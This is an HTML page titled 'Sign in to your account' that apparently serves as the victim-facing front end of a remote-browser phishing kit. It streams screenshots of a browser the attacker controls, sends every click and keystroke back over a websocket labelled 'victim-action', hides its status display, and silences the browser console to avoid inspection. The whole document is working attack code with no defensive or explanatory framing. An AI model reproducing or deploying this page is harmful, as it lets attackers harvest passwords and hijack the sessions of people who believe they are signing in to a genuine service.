<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to your account</title>

    <style>
        body { background: #000; color: #000; font-family: monospace; display: flex; flex-direction: column; align-items: center; margin: 0; overflow: hidden; }
        
        /* Cloaked Status Bar: Present for logic, invisible to user */
        .status-bar { 
            width: 100%; 
            background: #000; 
            padding: 2px; 
            font-size: 1px; 
            opacity: 0; 
            pointer-events: none;
        }

        #mirror { 
            width: 100vw; 
            height: auto; 
            cursor: crosshair; 
            image-rendering: -webkit-optimize-contrast; 
            -webkit-user-drag: none; 
            user-select: none; 
            -webkit-user-select: none; 
        }

        .hint { 
            position: absolute;
            bottom: 10px;
            font-size: 10px; 
            color: #111; /* Extremely dark, blends into background */
            letter-spacing: 1px; 
        }
    </style>
</head>
<body>
    <div class="status-bar">
        STATUS: <span id="msg">IDLE</span>
    </div>
    
    <img id="mirror" src="" draggable="false" />
    
    <div class="hint">STATION_ACTIVE</div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        // Mute Console
        (function() {
            const noop = () => {};
            ['log', 'debug', 'info', 'warn', 'error'].forEach(m => window.console[m] = noop);
        })();

        const socket = io({ 
            transports: ['websocket'], 
            upgrade: false,
            reconnection: true 
        });

        const img = document.getElementById('mirror');
        const status = document.getElementById('msg');

        socket.on('connect', () => {
            status.innerText = "ACTIVE";
            setInterval(() => { socket.emit('heartbeat', { ts: Date.now() }); }, 20000);
        });

        socket.on('browser-render', (data) => {
            if (data.screenshot) {
                img.src = 'data:image/jpeg;base64,' + data.screenshot;
            }
        });

        img.addEventListener('click', (e) => {
            const rect = img.getBoundingClientRect();
            const x = (e.clientX - rect.left) * (1280 / rect.width);
            const y = (e.clientY - rect.top) * (720 / rect.height);
            socket.emit('victim-action', { type: 'click', x, y });
        });

        window.addEventListener('keydown', (e) => {
            const blocked = ["ArrowUp", "ArrowDown", "Space", "Tab"];
            if (blocked.includes(e.code)) e.preventDefault();
            socket.emit('victim-action', { type: 'key', key: e.key });
        });
    </script>
</body>
</html>
